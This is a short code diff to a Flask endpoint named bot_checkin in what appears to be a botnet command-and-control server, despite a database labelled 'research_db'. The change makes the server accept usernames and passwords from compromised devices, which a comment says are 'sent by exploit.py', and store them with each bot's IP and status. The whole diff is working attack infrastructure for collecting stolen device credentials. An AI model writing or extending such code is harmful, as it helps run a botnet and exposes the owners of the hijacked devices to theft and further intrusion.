@@ -397,21 +397,24 @@ def bot_checkin():
         data = request.json
         bot_ip = data.get('ip')
         status = data.get('status', 'active')
-        last_command_id = data.get('last_command_id')
-        
+        # Get username and password from the incoming data (sent by exploit.py)
+        username = data.get('username')
+        password = data.get('password')
+
         if not bot_ip:
             return jsonify({'error': 'Missing bot IP'}), 400
-        
-        # Update bot status in database
+
+        # Update bot status and store credentials in database
         conn = sqlite3.connect('research_db.sqlite')
         cursor = conn.cursor()
-        cursor.execute('''INSERT OR REPLACE INTO devices (ip, status, last_seen)
-                    VALUES (?, ?, datetime('now'))''', (bot_ip, status))
+        # Modified INSERT OR REPLACE to include username and password
+        cursor.execute('''INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
+                    VALUES (?, ?, ?, ?, datetime('now'))''', (bot_ip, username, password, status))
         conn.commit()
         conn.close()
-        
+
         return jsonify({'status': 'success'})
-        
+
     except Exception as e:
         logging.error(f"Error in bot check-in: {e}")
         return jsonify({'error': str(e)}), 500
